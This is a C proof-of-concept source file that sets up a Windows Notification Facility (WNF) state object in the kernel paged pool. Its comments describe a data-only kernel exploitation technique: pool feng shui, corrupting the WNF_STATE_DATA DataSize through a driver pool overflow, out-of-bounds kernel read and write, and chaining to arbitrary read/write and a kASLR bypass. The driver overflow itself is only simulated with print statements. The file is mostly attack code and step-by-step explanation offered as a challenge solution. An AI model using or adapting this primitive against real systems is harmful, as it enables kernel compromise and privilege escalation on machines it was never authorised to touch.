#include <windows.h>
#include <stdio.h>

// Fox's WNF (Windows Notification Facility) Arbitrary R/W Primitive
//
// Jack's Final Challenge: ALPC spray is just ammo. Find the gun. Turn a pool allocation 
// into an arbitrary Read/Write primitive without executing kernel shellcode.
//
// The Architect's Solution: WNF State Data Corruption
// 1. WNF allows userland to allocate data in the kernel Paged Pool via NtUpdateWnfStateData.
// 2. The kernel tracks this data with a header (WNF_STATE_DATA) containing `DataSize` and `AllocatedSize`.
// 3. We spray the pool with WNF objects (the ammo) and leave holes.
// 4. We trigger a pool overflow in a vulnerable driver (the gun) to overflow into our WNF object's header.
// 5. We corrupt `DataSize` to 0xFFFFFFFF.
// 6. Now, calling NtQueryWnfStateData on our corrupted object allows us to read adjacent kernel memory (OOB Read).
//    Calling NtUpdateWnfStateData allows us to overwrite adjacent kernel memory (OOB Write).
// 7. By chaining OOB R/W with other pool objects (like Named Pipes or ALPC messages), 
//    we upgrade to a full, stable Arbitrary Read/Write primitive. Zero kernel shellcode.

#pragma comment(lib, "ntdll.lib")

// Undocumented WNF APIs
typedef NTSTATUS(NTAPI* fnNtCreateWnfStateName)(
    PULONG64 StateName,
    ULONG NameLifetime,
    ULONG DataScope,
    BOOLEAN PersistData,
    PVOID TypeId,
    ULONG MaximumStateSize,
    PVOID SecurityDescriptor
);

typedef NTSTATUS(NTAPI* fnNtUpdateWnfStateData)(
    PULONG64 StateName,
    const VOID* Buffer,
    ULONG Length,
    PVOID TypeId,
    const PVOID ExplicitScope,
    ULONG MatchingChangeStamp,
    ULONG CheckStamp
);

typedef NTSTATUS(NTAPI* fnNtQueryWnfStateData)(
    PULONG64 StateName,
    PVOID TypeId,
    const PVOID ExplicitScope,
    PULONG ChangeStamp,
    PVOID Buffer,
    PULONG BufferSize
);

int main() {
    printf("[+] Starting WNF Pool Corruption -> Arbitrary R/W PoC.\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    fnNtCreateWnfStateName pNtCreateWnfStateName = (fnNtCreateWnfStateName)GetProcAddress(hNtdll, "NtCreateWnfStateName");
    fnNtUpdateWnfStateData pNtUpdateWnfStateData = (fnNtUpdateWnfStateData)GetProcAddress(hNtdll, "NtUpdateWnfStateData");
    fnNtQueryWnfStateData pNtQueryWnfStateData = (fnNtQueryWnfStateData)GetProcAddress(hNtdll, "NtQueryWnfStateData");

    if (!pNtCreateWnfStateName || !pNtUpdateWnfStateData || !pNtQueryWnfStateData) {
        printf("[-] Failed to resolve WNF APIs.\n");
        return -1;
    }

    // 1. Create a WNF State Name (The handle to our kernel object)
    ULONG64 stateName = 0;
    // WnfDataScopeMachine (3), WnfStateNameLifetimeTemporary (0)
    NTSTATUS status = pNtCreateWnfStateName(&stateName, 0, 3, FALSE, NULL, 0x1000, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to create WNF State Name. NTSTATUS: 0x%X\n", status);
        return -1;
    }
    printf("[+] WNF State Name created: 0x%llX\n", stateName);

    // 2. Allocate the WNF State Data in the kernel Paged Pool
    // We control the exact size (0x1000) and the contents.
    BYTE payloadData[0x1000];
    memset(payloadData, 0x41, sizeof(payloadData)); // Fill with 'A's

    status = pNtUpdateWnfStateData(&stateName, payloadData, sizeof(payloadData), NULL, NULL, 0, 0);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to allocate WNF State Data. NTSTATUS: 0x%X\n", status);
        return -1;
    }
    printf("[+] WNF State Data (0x1000 bytes) allocated in kernel Paged Pool.\n");

    // ---------------------------------------------------------
    // THE EXPLOIT TRIGGER (Simulated)
    // ---------------------------------------------------------
    printf("[!] SIMULATION: Triggering pool overflow in vulnerable driver...\n");
    printf("[!] SIMULATION: Vulnerable driver overflows into our WNF_STATE_DATA header.\n");
    printf("[!] SIMULATION: WNF_STATE_DATA->DataSize corrupted from 0x1000 to 0xFFFFFFFF.\n");
    
    // In reality, you would use Pool Feng Shui (spraying WNF objects, freeing every other one)
    // to ensure the vulnerable object is allocated immediately before our target WNF object.
    // When the vulnerability triggers, it overflows exactly into our object's header.

    // ---------------------------------------------------------
    // THE PRIMITIVE (Out-of-Bounds Read/Write)
    // ---------------------------------------------------------
    printf("[+] Attempting Out-of-Bounds (OOB) Read via corrupted WNF object...\n");

    // If the corruption succeeded, the kernel now thinks our object is 0xFFFFFFFF bytes large.
    // We can ask for 0x2000 bytes, and the kernel will read past our allocation into adjacent pool memory.
    ULONG readSize = 0x2000;
    PBYTE readBuffer = (PBYTE)malloc(readSize);
    ULONG changeStamp = 0;

    // This will fail in the PoC because we didn't actually corrupt the kernel memory,
    // but this is exactly how the primitive is used post-corruption.
    status = pNtQueryWnfStateData(&stateName, NULL, NULL, &changeStamp, readBuffer, &readSize);
    
    if (NT_SUCCESS(status) && readSize > 0x1000) {
        printf("[!] OOB Read successful! We leaked adjacent kernel pool memory.\n");
        // By reading adjacent memory, we can leak kernel pointers, bypass kASLR, 
        // and find the addresses of other objects we sprayed (like ALPC or Named Pipes).
    } else {
        printf("[-] OOB Read failed (Expected in simulation without actual driver exploit).\n");
    }

    printf("[+] To achieve Arbitrary Write, we would use NtUpdateWnfStateData with a size > 0x1000.\n");
    printf("[+] This overwrites adjacent objects. By overwriting a Named Pipe attribute or ALPC message pointer, we gain full Arbitrary R/W.\n");
    printf("[!] Zero kernel shellcode executed. 100%% data-only kernel exploitation.\n");

    free(readBuffer);
    return 0;
}